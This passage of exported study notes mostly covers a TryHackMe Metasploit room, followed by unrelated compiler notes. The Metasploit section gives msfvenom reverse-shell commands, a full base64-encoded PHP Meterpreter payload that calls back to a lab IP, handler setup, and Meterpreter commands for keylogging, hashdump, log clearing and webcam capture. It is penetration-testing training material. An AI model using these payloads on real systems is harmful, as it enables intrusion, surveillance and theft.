video from Computerphile [https://www.youtube.com/watch?v=O4xNJsjtN6E](https://www.youtube.com/watch?v=O4xNJsjtN6E)","lastmodified":"2023-09-12T17:33:55.021934615Z","tags":["cs/hacking","cs/hacking/thm"]},"/notes/hacking/thm-metasploit":{"title":"TryHackMe - Metasploit","content":"# Metasploit\n---\nDocs: https://docs.metasploit.com/\n\nMetasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.\n\nThe Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.\n\nThe main components of the Metasploit Framework can be summarised as follows;\n-   **msfconsole**: The main command-line interface.\n-   **Modules**: supporting modules such as exploits, scanners, payloads, etc.\n-   **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern\\_create and pattern\\_offset.\n\n## Main Components\n-   **Exploit:** A piece of code that uses a vulnerability present on the target system.\n-   **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.\n-   **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.\n\nModules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).\n\n**Auxiliary**: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/aaeb4ff4aa7fc33289b2bb581d874f16.png)\n\n**Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.\n\nSignature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.  \n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/814490c07d05616009169c80cbb173a5.png)\n\n**Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.\n\nOn the other hand, “evasion” modules will try that, with more or less success.  \n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fe66d8ad4c915fa496a20e6f6291a0ad.png)\n\n**Exploits**: Exploits, neatly organised by target system.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/b940db3ff6ec430322206f2e161114fc.png)\n\n**NOPs**: NOPs (No OPeration) do nothing, literally.\n\nThey are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/71c6dee3ef13c5bc841aac92ce3253d7.png)\n\n**Payloads**: Payloads are codes that will run on the target system.\n\nExploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.\n\nRunning command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a \"shell\". Metasploit offers the ability to send different payloads that can open shells on the target system.\n  \n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a4c9a90b50c7c46a6c8c1a5f78500ad1.png)\n\nYou will see three different directories under payloads: singles, stagers and stages.\n\n-   **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.\n-   **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.\n-   **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.\n\nMetasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.\n\n-  `generic/shell\\_reverse\\_tcp`\n-   `windows/x64/shell/reverse\\_tcp`\n\nBoth are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “\\_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.\n\n**Post:** Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fa98b51a9b3862dc43eb0d3007057290.png)\n\n## Exploit Ranking\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a88c8d37283878e01447853a68578deb.png)\n\n## Scanning\nTo port scan can use:\n\n```\n           msf6 \u003e search portscan\n\nMatching Modules\n================\n\n   #  Name                                              Disclosure Date  Rank    Check  Description\n   -  ----                                              ---------------  ----    -----  -----------\n   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator\n   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner\n   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner\n   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner\n   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner\n   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner\n   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP \"XMas\" Port Scanner\n   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner\n\n\nInteract with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner\n\nmsf6 \u003e\n        \n```\n\nPort scanning modules will require you to set a few options:\n\n```\n           msf6 auxiliary(scanner/portscan/tcp) \u003e show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to check per host\n   DELAY        0                yes       The delay between connections, per thread, in milliseconds\n   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\n   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   THREADS      1                yes       The number of concurrent threads (max one per host)\n   TIMEOUT      1000             yes       The socket connect timeout in milliseconds\n\nmsf6 auxiliary(scanner/portscan/tcp) \u003e\n        \n```\n\n-   **CONCURRENCY:** Number of targets to be scanned simultaneously.\n-   **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.\n-   **RHOSTS:** Target or target network to be scanned.\n-   **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.\n\nYou can directly perform Nmap scans from the msfconsole prompt as shown below faster:  \n\nUsing Nmap from the Msfconsole prompt\n\n```\n           msf6 \u003e nmap -sS 10.10.12.229\n[*] exec: nmap -sS 10.10.12.229\n\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST\nNmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229)\nHost is up (0.0011s latency).\nNot shown: 992 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49158/tcp open  unknown\nMAC Address: 02:CE:59:27:C8:E3 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 64.19 seconds\nmsf6 \u003e\n        \n```\n\nAs for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.\n\n### UDP service Identification\nThe `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.\n\n### UDP scan\n```\n           msf6 auxiliary(scanner/discovery/udp_sweep) \u003e run\n\n[*] Sending 13 probes to 10.10.12.229-\u003e10.10.12.229 (1 hosts)\n[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/discovery/udp_sweep) \u003e\n        \n```\n\n### SMB Scans\nMetasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.\n\n```bash\n           msf6 auxiliary(scanner/smb/smb_version) \u003e run\n\n[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)\n[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/smb/smb_version) \u003e\n        \n```\n\nWhen performing service scans, it would be important not to omit more \"exotic\" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).\n\n## MsfVenom\nMsfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.  \n  \nMsfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).  \n\nMsfvenom payloads:\n\n```\n           root@ip-10-10-186-44:~# msfvenom -l payloads \n\nFramework Payloads (562 total) [--payload ]\n==================================================\n\n    Name                                                Description\n    ----                                                -----------\n    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\n    aix/ppc/shell_find_port                             Spawn a shell on an established connection\n    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)\n    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n    android/meterpreter/reverse_http                    Run a meterpreter server in Android.

The`msfvenom --list formats` command can be used to list supported output formats\n\n### Encoders\nContrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.\n\nGenerating a PHP payload:\n\n```\n           root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of php/base64\nphp/base64 succeeded with size 1507 (iteration=0)\nphp/base64 chosen with final size 1507\nPayload size: 1507 bytes\neval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));\nroot@ip-10-10-186-44:~#\n        \n```\n  \n### Handlers\nSimilar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.\n\nThe following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;\n\n1.  Generate the PHP shell using MSFvenom\n2.  Start the Metasploit handler\n3.  Execute the PHP shell  \n    \n\nMSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of a Kali Linux machine used in the attack and local port 7777 was chosen.\n\nGenerating a PHP reverse shell\n\n```\n           root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw \u003e reverse_shell.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: 3020 bytes\nroot@ip-10-0-2-19:~#\n        \n```\n\nPlease note: The output PHP file will miss the starting PHP tag commented and the end tag (`?\u003e`), as seen below.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/d82319bb6e03f8fbd8d005da9c31e59d.png)  \n\nThe reverse\\_shell.php file should be edited to convert it into a working PHP file. \n\nBelow: Comments removed from the beginning of the file.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/49c2132c9bd568cc3201bb38ed4ff7a0.png)  \n\nBelow: End tag added\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/ae579463375c5847a0b99d46f93c4142.png)  \n\nWe will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command.\n\nMulti handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.\n\nTo use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.\n\nSetting up the listener:\n\n```\n           msf6 \u003e use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) \u003e set payload php/reverse_php\npayload =\u003e php/reverse_php\nmsf5 exploit(multi/handler) \u003e set lhost 10.0.2.19\nlhost =\u003e 10.0.2.19\nmsf6 exploit(multi/handler) \u003e set lport 7777\nlport =\u003e 7777\nmsf6 exploit(multi/handler) \u003e show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (php/reverse_php):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)\n   LPORT  7777             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf6 exploit(multi/handler) \u003e\n        \n```\n\nOnce everything is set, we will `run` the handler and wait for the incoming connection.\n\nWaiting for the reverse shell:\n\n```\n           msf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.186.44:7777\n        \n```\n\nWhen the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.\n\nIf the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.\n\n### Other Payloads\nBased on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:\n\nIn all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  \n  \nLinux Executable and Linkable Format (elf)  \n`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf \u003e rev_shell.elf`  \nThe .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  \n  \nWindows  \n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe \u003e rev_shell.exe`  \n  \nPHP  \n`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw \u003e rev_shell.php`  \n  \nASP  \n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp \u003e rev_shell.asp`  \n  \nPython  \n`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw \u003e rev_shell.py`  \n  \nAll of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.\n\n## Meterpreter\nMeterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.\n\nMeterpreter has many versions which will provide different functionalities based on the target system.\n\n**How does Meterpreter work?**\n\nMeterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.\n\nMeterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.  \n\nWhile Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.\n\nThe example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the `getpid` command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).\n\nGetpid\n\n```\n           meterpreter \u003e getpid \nCurrent pid: 1304\n        \n```\n\nIf we list processes running on the target system using the `ps` command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.\n\nThe ps command\n\n```\n           meterpreter \u003e ps\n\nProcess List\n============\n\n PID   PPID  Name                  Arch  Session  User                          Path\n ---

\n```\n\nEven if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)\n\nThe Meterpreter process\n\n```\n           C:\\Windows\\system32\u003etasklist /m /fi \"pid eq 1304\"\ntasklist /m /fi \"pid eq 1304\"\n\nImage Name                     PID Modules

These will be different for other Meterpreter versions.\n\nMeterpreter commands\nCore commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.\n\n\nCore commands\n\n    background: Backgrounds the current session\n    exit: Terminate the Meterpreter session\n    guid: Get the session GUID (Globally Unique Identifier)\n    help: Displays the help menu\n    info: Displays information about a Post module\n    irb: Opens an interactive Ruby shell on the current session\n    load: Loads one or more Meterpreter extensions\n    migrate: Allows you to migrate Meterpreter to another process\n    run: Executes a Meterpreter script or Post module\n    sessions: Quickly switch to another session\n\nFile system commands\n\n    cd: Will change directory\n    ls: Will list files in the current directory (dir will also work)\n    pwd: Prints the current working directory\n    edit: will allow you to edit a file\n    cat: Will show the contents of a file to the screen\n    rm: Will delete the specified file\n    search: Will search for files\n    upload: Will upload a file or directory\n    download: Will download a file or directory\n\nNetworking commands\n\n    arp: Displays the host ARP (Address Resolution Protocol) cache\n    ifconfig: Displays network interfaces available on the target system\n    netstat: Displays the network connections\n    portfwd: Forwards a local port to a remote service\n    route: Allows you to view and modify the routing table\n\nSystem commands\n\n    clearev: Clears the event logs\n    execute: Executes a command\n    getpid: Shows the current process identifier\n    getuid: Shows the user that Meterpreter is running as\n    kill: Terminates a process\n    pkill: Terminates processes by name\n    ps: Lists running processes\n    reboot: Reboots the remote computer\n    shell: Drops into a system command shell\n    shutdown: Shuts down the remote computer\n    sysinfo: Gets information about the remote system, such as OS\n\nOthers Commands (these will be listed under different menu categories in the help menu)\n\n    idletime: Returns the number of seconds the remote user has been idle\n    keyscan_dump: Dumps the keystroke buffer\n    keyscan_start: Starts capturing keystrokes\n    keyscan_stop: Stops capturing keystrokes\n    screenshare: Allows you to watch the remote user's desktop in real time\n    screenshot: Grabs a screenshot of the interactive desktop\n    record_mic: Records audio from the default microphone for X seconds\n    webcam_chat: Starts a video chat\n    webcam_list: Lists webcams\n    webcam_snap: Takes a snapshot from the specified webcam\n    webcam_stream: Plays a video stream from the specified webcam\n    getsystem: Attempts to elevate your privilege to that of local system\n    hashdump: Dumps the contents of the SAM database\n\nAlthough all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.

Decorated here means that all identifier references have been resolved.\n\nFrom this structure we can **generate** the corresponding code in the **target** language. This is what a code generator does.\n\n![code-generation-01](notes/images/code-generation-01.png)\n\nSome compilers generate **twice**: they first generate code in some \"intermediate language\" like SIL, LLVM IR, MIR etc. Then they do the \"real\" **code generation** into a target language that is directly runnable (or really close to it), like virtual machine code, assembly language, or machine language.\n\n![code-generation-02](notes/images/code-generation-02.png)\n\n## What to address?\nConsider code generation of target code from TAC `a := b + c`:\n\n```assembly\nLDI    b,   R_i\nLDI    c,   R_j\nADD    R_i, R_j\nSTI    R_j, a\n```\n\nHow do we choose `R_i` and `R_j`?\n\n## Goals of Code Generation\n- Correctness\n- Efficiency\n- Self-efficiency\n\n## Source\n- CS LMU - Intro to CodeGen ([here](https://cs.lmu.edu/~ray/notes/codegen/))\n","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training"]},"/notes/private/work/compiler-optimisation":{"title":"Compiler Optimsation","content":"[Compilers](notes/private/work/compilers.md) perform a set of transformations on the source code. While some of the transformations are necessary to generate machine code, most of the transformations are done to improve the performance of programs or to reduce the code size. \n\nThese transformations are called _compiler optimisations_. This chapter introduces both types of compiler optimisations. The goal of this chapter is to enable learners to use the optimisations effectively. We do not discuss how these optimisations are implemented in the [compilers](notes/private/work/compilers.md).\n\n## Performance\nWhen we talk about the performance of an application, we generally refer to how much time it takes to do a certain task. \n\nAn application needs to perform tasks within a reasonable amount of time to be practically useful. In many cases, we want applications to run as fast as possible. Although there are several ways to improve the performance of applications, one of them is taking advantage of compiler optimisation techniques. \n\nIt should be noted that not all parts of a program need to be performant to be practically usable. Only certain parts often called a ‘bottleneck’ need to be as performant as possible.\n\n## Flags\n- [Here](notes/general/compiler-flags.md#Optimising%20for%20Performance%7COptimisation%20flags)\n\n## Optimising Programs for Code Size\nThe code size of embedded applications has been a concern for a very long time. While storage becomes cheaper and smaller, developers find creative ways to increase code size by adding features or unnecessary software engineering. \n\nCompilers have come a long way in optimising applications for code size. While most compiler optimisations were focused on application performance, we have seen an increase in code size optimisations in recent years.\n\n### Measuring Code Size and Different Sections\nThere are three popular tools to measure the code size of a binary.\n\n1.  Size: [GNU Binutils](https://www.gnu.org/software/binutils/)\n2.  Strings: [GNU Binutils](https://www.gnu.org/software/binutils/)\n3.  [Bloaty](https://github.com/google/bloaty)\n\n#### Size  \nThe size utility can show the size of each section of a binary.\n\n```bash\n$ size gcc/11/libstdc++.dylib\n\n__TEXT    __DATA    __OBJC    others    dec    hex  \n1703936    65536    0    1851392    3620864    374000\n```\n\n#### Strings  \nShows all the strings in a binary.\n\n```bash\n$ strings gcc/11/libstdc++.dylib | wc -l\n\n2180\n```\n\n#### Bloaty\nThis can be used to have a deeper analysis of binaries for different platforms. It even annotates code size to the source file to help better discover code-size opportunities.\n\n```bash\n$ bloaty gcc/11/libstdc++.dylib\n\n     FILE SIZE     VM SIZE**  \n--------------  -------------- \n 29.1%  1.00Mi  29.0%. 1.00Mi   __TEXT,__text \n 25.0%   882Ki  25.0%   882Ki   String Table \n 16.6%   583Ki  16.5%   583Ki   Symbol Table \n 12.3%   433Ki  12.2%   433Ki   __TEXT,__eh_frame \n  5.0%   176Ki   5.0%   176Ki   Export Info\n  4.1%   146Ki   4.1%   146Ki   __TEXT,__consts \n  2.5%  87.8Ki   2.5%  87.8Ki   Weak Binding Infos \n  1.2%  41.6Ki   1.2%  41.6Ki   __DATA,__gcc_except_tabs \n  1.0%  36.9Ki   1.0%  36.9Ki   __DATA_CONST,__consts \n  0.9%  33.3Ki   0.9%  33.3Ki   __TEXT,__text_colds\n  0.5%  16.1Ki   0.5%  16.1Ki   [10 Others]s \n  0.5%  15.9Ki   0.0%     945   [__DATA]s \n  0.4%  15.0Ki   0.4%  15.0Ki   __TEXT,__cstrings \n  0.0%    4      0.3%  11.3Ki   [__LINKEDIT]s \n  0.0%    0      0.2%  8.12Ki   __DATA,__bss  \n  0.2%  8.01Ki   0.2%  8.01Ki   [__DATA_CONST]s \n  0.2%  7.43Ki   0.2%  7.43Ki   Function Start Addressess \n  0.0%    0      0.2%  6.88Ki   __DATA,__commons \n  0.2%  6.08Ki   0.2%  6.08Ki   Indirect Symbol Tables \n  0.1%  4.59Ki   0.1%  4.59Ki   __DATA,__la_symbol_ptrs \n  0.1%  3.44Ki   0.1%  3.44Ki   __TEXT,__stubs100.0%  3.44Mi 100.0%  3.45Mi   TOTAL\n```","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training"]},"/notes/private/work/compiler-toolchains":{"title":"Compiler Toolchains","content":"- [GNU](notes/general/gnu.md)\n- [RISC-V Toolchain](notes/general/riscv-toolchain.md)\n- [CORE-V Toolchain](notes/private/work/projects/corev/corev-toolchain.md)\n\n## What is a Compiler Toolchain?\nA compiler toolchain is a set of tools, supporting libraries, and header files that help build a program from source to an executable that can run on a machine.\n\nHave you ever wondered what dependencies are required to compile a simple `hello-world` program? Even a small `hello-world` program needs a set of header files and libraries that are used by the compiler. \n\nThe header file (e.g., `iostream`), is required to find the declaration of functions that are not available in the `hello-world` program (e.g, `std::cout`). \n\nThe libraries are required to find definitions of functions (e.g., `std::operator\u003c\u003c`) during the linkage process. As a result of the compilation process, an executable is created and runs on the machine.\n\n## The Compilation Process\nWhen a compiler like g++ is used to compile a C++ program, the compilation process actually involves multiple steps depending on what output is desired. To see the steps involved in the compilation process, `-v` needs to be passed to the compiler. \n\nWe can use a small `hello-world` program like the following to understand the compilation process:\n\n```c\n#include\u003ciostream\u003e  \nint main() {  \n   std::court \u003c\u003c \"Hello world\\n\";  \n   return 0;  \n}\n```\n\nLet’s inspect the output of the invocation of the g++ compiler by enabling the verbose output. Although the verbose invocation outputs a lot of information, the relevant lines are the compiler invocation, the assembler invocation, and the linker invocation. \n\nDidn’t we say just before that `g++ hello.cpp` was a compiler invocation? That is partially true because g++ is not a compiler, it is a _compiler-driver_. This may sound strange to many, but that is true. A _compiler-driver_ is a program that invokes different tools in the compiler toolchain to translate source code to a target language.\n\nThe compiler in this case is `cclplus` and the invocation is below.\n\n```bash\n$ g++ hello.cpp -v  \n/usr/lib/gcc/x86_64-linux-gnu/7/cc1plus -quiet -v 